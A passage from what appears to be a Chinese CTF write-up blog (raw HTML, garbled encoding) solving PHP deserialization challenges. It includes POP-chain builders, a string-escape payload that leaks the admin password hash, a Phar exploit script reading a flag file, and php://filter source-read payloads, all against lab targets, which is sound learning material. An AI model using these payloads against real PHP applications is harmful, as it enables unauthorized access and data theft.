<span class="title">Info</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="keyword">public</span> $CtrlCase;</span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">$this</span>-&gt;CtrlCase = <span class="keyword">new</span> dbCtrl();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UpdateHelper</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="keyword">public</span> $sql;</span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">$this</span>-&gt;sql = <span class="keyword">new</span> User();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbCtrl</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="keyword">public</span> $name = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line">   <span class="keyword">public</span> $password = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$o = <span class="keyword">new</span> UpdateHelper;</span><br><span class="line"><span class="keyword">echo</span> serialize($o);</span><br></pre></td></tr></table></figure>
<p>åºåˆ—åŒ–çš„ç»“æœ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username&#x3D;?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>æ„é€ å¥½äº†POPé“¾ï¼Œæ¥ä¸‹æ¥å°±æ˜¯è¦æ‰¾åˆ°è§¦å‘ååºåˆ—åŒ–çš„ç‚¹ã€‚</p>
<p>ä»update.php å¯ä»¥è·Ÿè¿›Userç±»çš„update()å‡½æ•°ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    $Info=unserialize(<span class="keyword">$this</span>-&gt;getNewinfo());</span><br><span class="line">    $age=$Info-&gt;age;</span><br><span class="line">    $nickname=$Info-&gt;nickname;</span><br><span class="line">    $updateAction=<span class="keyword">new</span> UpdateHelper($_SESSION[<span class="string">&#x27;id&#x27;</span>],$Info,<span class="string">&quot;update user SET age=<span class="subst">$age</span>,nickname=<span class="subst">$nickname</span> where id=&quot;</span>.$_SESSION[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line">    <span class="comment">//è¿™ä¸ªåŠŸèƒ½è¿˜æ²¡æœ‰å†™å®Œ å…ˆå å‘</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ç»§ç»­è·Ÿè¿›<code>getNewInfo()</code>å‡½æ•°</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getNewInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    $age=$_POST[<span class="string">&#x27;age&#x27;</span>];</span><br><span class="line">    $nickname=$_POST[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">    <span class="keyword">return</span> safe(serialize(<span class="keyword">new</span> Info($age,$nickname)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™ä¸ªå‡½æ•°çš„è¿”å›å€¼æ˜¯ä¸€ä¸ªå…ˆåºåˆ—åŒ–åœ¨ç»è¿‡safe()å‡½æ•°å¤„ç†çš„Infoç±»å¯¹è±¡ã€‚</p>
<p>æ‰€ä»¥æœ€ç»ˆèƒ½å¤Ÿååºåˆ—åŒ–çš„ä¸æ˜¯æˆ‘ä»¬ç›´æ¥ä¼ å…¥çš„å­—ç¬¦ä¸²ï¼Œè€Œæ˜¯ç”¨æˆ‘ä»¬çš„å€¼å®ä¾‹åŒ–ä¸€ä¸ªInfoç±»çš„å¯¹è±¡ï¼Œç„¶åå¯¹è¿™ä¸ªå¯¹è±¡è¿›è¡Œå®ä¾‹åŒ–ï¼Œå†å¯¹è¿™ä¸ªåºåˆ—åŒ–ç»“æœè¿›è¡Œsafe()å¤„ç†ï¼Œæœ€åå¾—åˆ°çš„å€¼å†è¿›è¡Œååºåˆ—åŒ–ã€‚</p>
<p>æ‰€ä»¥æƒ³è¦å‘åºåˆ—åŒ–æˆ‘ä»¬çš„payloadï¼Œå°±å¾—æ§åˆ¶ Infoç±»å¯¹è±¡çš„åºåˆ—åŒ–ä¸²ï¼Œçœ‹ä¸€ä¸‹è¿™ä¸ªåºåˆ—åŒ–ä¸²çš„æ ¼å¼</p>
<p>ï¼ˆå‡è®¾age=20ï¼›nickname=letheï¼‰ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:2:&quot;20&quot;;s:8:&quot;nickname&quot;;s:5:&quot;lethe&quot;;s:8:&quot;CtrlCase&quot;;N;&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œçš„åŸç†æœ‰ç‚¹ç±»ä¼¼æ³¨å…¥ï¼Œéƒ½æ˜¯é—­åˆï¼Œå…ˆçœ‹ä¸€ä¸‹æˆ‘ä»¬æ„é€ çš„payloadå¦‚ä¸‹ï¼Œæœªé€ƒé€¸å­—ç¬¦ä¸²å‰:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username&#x3D;?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;&#125;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬åœ¨å·²åºåˆ—åŒ–ä¸²å‰é¢åŠ ä¸Šäº†<code>&quot;;s:8:&quot;CtrlCase&quot;;</code>ï¼Œåœ¨æœ€ååŠ ä¸Šäº†ä¸€ä¸ª<code>&#125;</code>ï¼ˆæ•´ä¸ªé•¿åº¦ä¸º263ï¼‰ï¼Œè¿™æ ·æˆ‘ä»¬å°†å…¶ä½œä¸º<code>new Info($age,$nickname)</code>çš„nicknameä¼ å…¥æ—¶ï¼Œåºåˆ—åŒ–çš„ç»“æœå¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:2:&quot;20&quot;;s:8:&quot;nickname&quot;;s:263:&quot;&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username&#x3D;?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;&#125;&#125;&#125;&#125;&#125;&quot;;s:8:&quot;CtrlCase&quot;;N;&#125;</span><br></pre></td></tr></table></figure>
<p>ä½†æ˜¯é•¿åº¦ä¸º263çš„payloadè¿˜æ˜¯å½“ä½œäº†ä¸€ä¸ªæ™®é€šå­—ç¬¦ä¸²ï¼Œè€Œä¸æ˜¯åºåˆ—åŒ–é‡Œçš„å†…å®¹ã€‚</p>
<p>è¿™æ—¶å€™å°±éœ€è¦ç”¨åˆ°å­—ç¬¦é€ƒé€¸çš„åŸç†äº†ï¼Œæˆ‘ä»¬åœ¨payloadçš„å‰é¢åŠ ä¸Š263ä¸ª<code>union</code>ï¼Œåœ¨ç»è¿‡safeå‡½æ•°ä¹‹åï¼Œ<code>union</code>å…¨éƒ¨è¢«æ›¿æ¢æˆ<code>hacker</code>ï¼Œä¹Ÿå°±æ˜¯ç›¸å½“äºæ–°å¢äº†263ä¸ªå­—ç¬¦ï¼Œè¿™æ ·å°±å¯¼è‡´è·Ÿåœ¨åé¢çš„é•¿åº¦ä¸º263ä¸ªå­—ç¬¦çš„payloadæˆåŠŸé€ƒé€¸ã€‚</p>
<p>è€Œä¹‹æ‰€å‰é¢æ„é€ çš„æ—¶å€™åœ¨æœ€åé¢åŠ ä¸€ä¸ª<code>&#125;</code>ï¼Œæ˜¯å› ä¸ºInfoç±»çš„å¯¹è±¡åªæœ‰3ä¸ªå˜é‡ï¼Œ<code>&#125;</code>å‰é¢å·²ç»æœ‰3ä¸ªå˜é‡æ»¡è¶³äº†åºåˆ—åŒ–ä¸²çš„è¦æ±‚äº†ï¼Œæ‰€ä»¥åŠ ä¸€ä¸ª<code>&#125;</code>æ¥é—­åˆæ•´ä¸ªåºåˆ—åŒ–ä¸²ã€‚</p>
<p>æœ€ç»ˆpayloadå¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">age&#x3D;1&amp;nickname&#x3D;unionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunion&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username&#x3D;?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;&#125;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>åœ¨update.phpå†…postæäº¤<code>age=123&amp;nickname=</code>åé¢æ¥ä¸Šè¾“å‡ºç»“æœï¼Œå°±ä¼šå¾—åˆ°adminå¯†ç çš„md5ã€‚</p>
<h2 id="SWPU2019-SimplePHP">SWPU2019 SimplePHP</h2>
<h3 id="è€ƒç‚¹-v12">è€ƒç‚¹</h3>
<ul>
<li>æ–‡ä»¶åŒ…å«</li>
<li>Pharååºåˆ—åŒ–</li>
</ul>
<h3 id="è§£é¢˜-v12">è§£é¢˜</h3>
<p>æŸ¥çœ‹æ–‡ä»¶é¡µé¢æœ‰æ–‡ä»¶åŒ…å«ï¼Œå¯ä»¥è¯»å–æºç ï¼š</p>
<p>file.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">header(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>);  </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;function.php&#x27;</span>; </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;class.php&#x27;</span>; </span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/var/www/html/&#x27;</span>); </span><br><span class="line">$file = $_GET[<span class="string">&quot;file&quot;</span>] ? $_GET[<span class="string">&#x27;file&#x27;</span>] : <span class="string">&quot;&quot;</span>; </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($file)) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line">$show = <span class="keyword">new</span> Show(); </span><br><span class="line"><span class="keyword">if</span>(file_exists($file)) &#123; </span><br><span class="line">    $show-&gt;source = $file; </span><br><span class="line">    $show-&gt;_show(); </span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="keyword">empty</span>($file))&#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;file doesn\&#x27;t exists.&#x27;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p>function.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">//show_source(__FILE__); </span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;base.php&quot;</span>; </span><br><span class="line">header(<span class="string">&quot;Content-type: text/html;charset=utf-8&quot;</span>); </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file_do</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> $_FILES; </span><br><span class="line">    $filename = md5($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>].$_SERVER[<span class="string">&quot;REMOTE_ADDR&quot;</span>]).<span class="string">&quot;.jpg&quot;</span>; </span><br><span class="line">    <span class="comment">//mkdir(&quot;upload&quot;,0777); </span></span><br><span class="line">    <span class="keyword">if</span>(file_exists(<span class="string">&quot;upload/&quot;</span> . $filename)) &#123; </span><br><span class="line">        unlink($filename); </span><br><span class="line">    &#125; </span><br><span class="line">    move_uploaded_file($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],<span class="string">&quot;upload/&quot;</span> . $filename); </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;ä¸Šä¼ æˆåŠŸ!&quot;);&lt;/script&gt;&#x27;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> $_FILES; </span><br><span class="line">    <span class="keyword">if</span>(upload_file_check()) &#123; </span><br><span class="line">        upload_file_do(); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file_check</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> $_FILES; </span><br><span class="line">    $allowed_types = <span class="keyword">array</span>(<span class="string">&quot;gif&quot;</span>,<span class="string">&quot;jpeg&quot;</span>,<span class="string">&quot;jpg&quot;</span>,<span class="string">&quot;png&quot;</span>); </span><br><span class="line">    $temp = explode(<span class="string">&quot;.&quot;</span>,$_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]); </span><br><span class="line">    $extension = end($temp); </span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>($extension)) &#123; </span><br><span class="line">        <span class="comment">//echo &quot;&lt;h4&gt;è¯·é€‰æ‹©ä¸Šä¼ çš„æ–‡ä»¶:&quot; . &quot;&lt;h4/&gt;&quot;; </span></span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123; </span><br><span class="line">        <span class="keyword">if</span>(in_array($extension,$allowed_types)) &#123; </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;/script&gt;&#x27;</span>; </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p>class.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $test;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$name</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str = $name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;test = <span class="keyword">$this</span>-&gt;str;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;   <span class="comment">//$this-&gt;source = phar://phar.jpg</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $content = <span class="keyword">$this</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>]-&gt;source;</span><br><span class="line">        <span class="keyword">return</span> $content;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params">$key,$value</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;$key = $value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/http|https|file:|gopher|dict|\.\.|f1ag/i&#x27;</span>,<span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            highlight_file(<span class="keyword">$this</span>-&gt;source);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/http|https|file:|gopher|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker~&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $params;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;params = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params">$key</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get($key);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params">$key</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;params[$key])) &#123;</span><br><span class="line">            $value = <span class="keyword">$this</span>-&gt;params[$key];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $value = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;file_get($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span>(<span class="params">$value</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $text = base64_encode(file_get_contents($value));</span><br><span class="line">        <span class="keyword">return</span> $text;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>class.phpä¸­æœ‰ä¸€ä¸ªå¾ˆæ˜æ˜¾çš„POPé“¾ï¼Œæ­¤å¤–ï¼Œç”±äºæ²¡æœ‰unserializeå‡½æ•°è§¦å‘ååºåˆ—åŒ–ï¼Œé‚£ä¹ˆå°±åªèƒ½ä¸Šä¼ ä¸€ä¸ªpharæ¥è§¦å‘ååºåˆ—åŒ–ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $test;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $params;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$c1e4r = <span class="keyword">new</span> C1e4r();</span><br><span class="line">$show = <span class="keyword">new</span> Show();</span><br><span class="line">$test = <span class="keyword">new</span> Test();</span><br><span class="line">$c1e4r-&gt;str = $show;</span><br><span class="line">$show-&gt;str[<span class="string">&#x27;str&#x27;</span>] = $test;</span><br><span class="line">$test-&gt;params[<span class="string">&#x27;source&#x27;</span>] = <span class="string">&#x27;/var/www/html/f1ag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">&quot;exp.phar&quot;</span>); <span class="comment">//.pharæ–‡ä»¶</span></span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ? &gt;&#x27;</span>); <span class="comment">//å›ºå®šçš„</span></span><br><span class="line">$phar-&gt;setMetadata($c1e4r); <span class="comment">//è§¦å‘çš„å¤´æ˜¯C1e4rç±»ï¼Œæ‰€ä»¥ä¼ å…¥C1e4rå¯¹è±¡</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">&quot;exp.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//éšä¾¿å†™ç‚¹ä»€ä¹ˆç”Ÿæˆä¸ªç­¾å</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure>
<p>ç”Ÿæˆexp.pharåæ”¹åç¼€ä¸ºgifï¼Œç„¶åæŸ¥çœ‹ä¸Šä¼ çš„æ–‡ä»¶å</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200816000059.png" alt=""></p>
<p>æœ€åä½¿ç”¨pharåè®®è¯»å–è¯¥æ–‡ä»¶ã€‚</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200816000157.png" alt=""></p>
<p>è§£ç å¾—åˆ°flagã€‚</p>
<h2 id="GXYCTF2019-Babysqli-v3">GXYCTF2019 Babysqli v3</h2>
<h3 id="è€ƒç‚¹-v13">è€ƒç‚¹</h3>
<ul>
<li>å¼±å£ä»¤</li>
<li>PHPååºåˆ—åŒ–</li>
</ul>
<h3 id="è§£é¢˜-v13">è§£é¢˜</h3>
<p>å¼±å£ä»¤çˆ†ç ´ã€‚ã€‚ã€‚ã€‚ã€‚å¾—åˆ°admin/passwordã€‚</p>
<p>PHPä¼ªåè®®è¯»å–æºç <code>php://filter/read=convert.base64-encode/resource=home.php</code></p>
<p>home.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;meta http-equiv=\&quot;Content-Type\&quot; content=\&quot;text/html; charset=utf-8\&quot; /&gt; &lt;title&gt;Home&lt;/title&gt;&quot;</span>;</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_SESSION[<span class="string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="string">&quot;/.?f.?l.?a.?g.?/i&quot;</span>, $_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">if</span>(preg_match(<span class="string">&quot;/home$/i&quot;</span>, $_GET[<span class="string">&#x27;file&#x27;</span>]) <span class="keyword">or</span> preg_match(<span class="string">&quot;/upload$/i&quot;</span>, $_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">				$file = $_GET[<span class="string">&#x27;file&#x27;</span>].<span class="string">&quot;.php&quot;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				$file = $_GET[<span class="string">&#x27;file&#x27;</span>].<span class="string">&quot;.fxxkyou!&quot;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;å½“å‰å¼•ç”¨çš„æ˜¯ &quot;</span>.$file;</span><br><span class="line">			<span class="keyword">require</span> $file;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;no permission!&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>upload.php</p>
